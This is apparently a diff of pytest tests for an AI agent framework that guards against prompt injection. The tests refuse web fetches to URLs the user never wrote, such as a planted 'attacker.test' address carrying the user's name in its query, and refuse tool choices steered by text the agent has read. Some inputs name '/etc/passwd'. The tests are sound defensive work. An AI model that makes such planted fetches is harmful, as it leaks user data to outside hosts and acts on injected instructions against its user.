@@ -315,6 +315,81 @@ async def test_file_write_without_file_intent_is_refused() -> None:
 
 
 @pytest.mark.asyncio
+async def test_fetch_of_an_address_the_user_never_wrote_is_refused() -> None:
+    """A URL planted in a file the model read is not fetched (prompt injection)."""
+    kernel, router, registry = _make_kernel()
+    router.complete.side_effect = [
+        _mock_model_response('["Summarize the file"]'),
+        _mock_tool_call_response("web_fetch", {"url": "https://attacker.test/notes?u=Sam"}),
+        _mock_model_response('{"progress": true}'),  # reflector: the refused fetch
+        _mock_model_response("Here is the summary."),
+    ]
+
+    state = await kernel.run("Summarize release-notes.md")
+
+    registry.execute.assert_not_awaited()
+    assert "Not fetched" in [m for m in state.messages if m.role == "tool"][0].content
+    assert state.final_answer == "Here is the summary."
+
+
+@pytest.mark.asyncio
+async def test_fetch_of_an_address_the_user_wrote_runs() -> None:
+    """A page the user named is fetched, whatever scheme or trailing slash the model adds."""
+    kernel, router, registry = _make_kernel()
+    router.complete.side_effect = [
+        _mock_model_response('["Fetch the page"]'),
+        _mock_tool_call_response("web_fetch", {"url": "https://example.com/"}),
+        _mock_model_response('{"progress": true}'),
+        _mock_model_response("The page is a placeholder for examples."),
+    ]
+
+    await kernel.run("Fetch example.com and tell me what it says")
+
+    registry.execute.assert_awaited_once_with("web_fetch", url="https://example.com/")
+
+
+def test_fetch_provenance_compares_path_and_query_exactly() -> None:
+    """Only addresses the user wrote may be fetched; data can't ride in a new path or query."""
+    from cortex.agent.executor import _is_unrequested_fetch
+
+    def refused(url: str, *user_texts: str) -> bool:
+        return _is_unrequested_fetch("web_fetch", {"url": url}, list(user_texts))
+
+    assert not refused("https://example.com/a?b=1", "Fetch https://example.com/a?b=1", "Again")
+    assert refused("https://example.com/a?b=2", "Fetch https://example.com/a?b=1")
+    assert refused("https://example.com/Sam", "Fetch https://example.com")
+    assert refused("https://attacker.test/c", "Summarize release-notes.md")
+    # No host: web_fetch itself rejects these with a specific error.
+    assert not refused("file:///etc/passwd", "Fetch file:///etc/passwd")
+    assert not _is_unrequested_fetch("filesystem", {"path": "notes.md"}, ["Read notes.md"])
+
+
+def test_fetch_provenance_never_widens_what_the_user_wrote() -> None:
+    """http may become https, never the reverse, and the host stays as written (#58)."""
+    from cortex.agent.executor import _is_unrequested_fetch
+
+    def refused(url: str, *user_texts: str) -> bool:
+        return _is_unrequested_fetch("web_fetch", {"url": url}, list(user_texts))
+
+    assert refused("http://example.com", "Read https://example.com.")
+    assert refused("http://example.com/path", "Read https://www.example.com/path")
+    assert refused("https://example.com/path", "Read https://www.example.com/path")
+    assert refused("https://www.example.com/", "Fetch example.com")
+    assert refused("https://docs.example.com", "Fetch example.com")
+    assert not refused("https://example.com", "Read http://example.com")
+    assert not refused("http://example.com/docs/", "Read example.com/docs")
+    assert not refused("https://example.com/docs", "Read example.com/docs")
+    assert not refused("HTTPS://Example.com:443/docs#intro", "Read https://example.com/docs")
+    # web_fetch opens a bare host over https, so that is what gets compared.
+    assert not refused("example.com", "Read https://example.com")
+    assert refused("example.com", "Read http://example.org")
+    # A URL inside a query string is not the scheme of the address.
+    assert refused(
+        "http://example.com/go?to=https://x.test", "Read https://example.com/go?to=https://x.test"
+    )
+
+
+@pytest.mark.asyncio
 async def test_file_write_with_file_intent_runs() -> None:
     """An explicit request to save a file still writes it."""
     kernel, router, registry = _make_kernel()
@@ -629,6 +704,8 @@ async def test_session_history_is_replayed_and_turns_are_stored() -> None:
     assert ("s-1", "user", "What is my name?") in stored
     assert ("s-1", "assistant", "Your name is Roydon.") in stored
     assert state.final_answer == "Your name is Roydon."
+    # Facts are learned from this turn's message, not whatever the history holds later.
+    memory_manager.end_session.assert_awaited_once_with("s-1", "What is my name?")
 
 
 @pytest.mark.asyncio
@@ -977,6 +1054,22 @@ def test_explicit_save_request_plans_a_filesystem_write() -> None:
     assert _ensure_file_save_step(reading, "Write Python code that reads data.csv") == reading
 
 
+def test_file_name_passed_as_content_on_a_read_becomes_the_path() -> None:
+    """{"action": "read_file", "content": "notes.md"} (a small-model slip) still reads the file."""
+    from cortex.agent.executor import _repaired_args
+
+    slip = {"action": "read_file", "content": "release-notes.md"}
+    assert _repaired_args("filesystem", slip) == {"action": "read_file", "path": "release-notes.md"}
+    # A write's content is data, never a path; nor is multi-line text or a call with a path.
+    write = {"action": "write_file", "content": "notes.md"}
+    assert _repaired_args("filesystem", write) == write
+    lines = {"action": "read_file", "content": "one\ntwo"}
+    assert _repaired_args("filesystem", lines) == lines
+    both = {"action": "read_file", "path": "a.md", "content": "b.md"}
+    assert _repaired_args("filesystem", both) == both
+    assert _repaired_args("python_exec", {"content": "x"}) == {"content": "x"}
+
+
 def test_quoted_text_is_not_an_instruction() -> None:
     """Text handed over to summarise cannot ask for a file write (prompt injection)."""
     from cortex.agent.executor import _is_unrequested_write, instruction_text
@@ -1035,3 +1128,21 @@ def test_test_it_counts_as_a_run_request() -> None:
     assert _planned_tools(
         ["Run the code with python_exec"], ["python_exec"], "test it with [1, 3, 5] and [2, 4, 6]"
     ) == ["python_exec"]
+
+
+def test_tools_chosen_by_outside_text_are_not_learned() -> None:
+    """After a file, page or document is read, only tools the user asked for count (#56)."""
+    from cortex.agent.kernel import _chosen_by_outside_text
+
+    assert _chosen_by_outside_text(["filesystem", "python_exec"], "Summarize notes.md")
+    assert _chosen_by_outside_text(["web_fetch", "calculator"], "Fetch https://example.com")
+    assert _chosen_by_outside_text(["doc_search", "my_plugin"], "Search the docs for limits")
+    assert not _chosen_by_outside_text(
+        ["filesystem", "python_exec"], "Read notes.md and use Python to count its words"
+    )
+    assert not _chosen_by_outside_text(
+        ["web_fetch", "filesystem"], "Fetch https://example.com and save it to page.md"
+    )
+    # Nothing outside was read before the second tool.
+    assert not _chosen_by_outside_text(["calculator", "filesystem"], "What is 2+2?")
+    assert not _chosen_by_outside_text(["filesystem"], "Summarize notes.md")
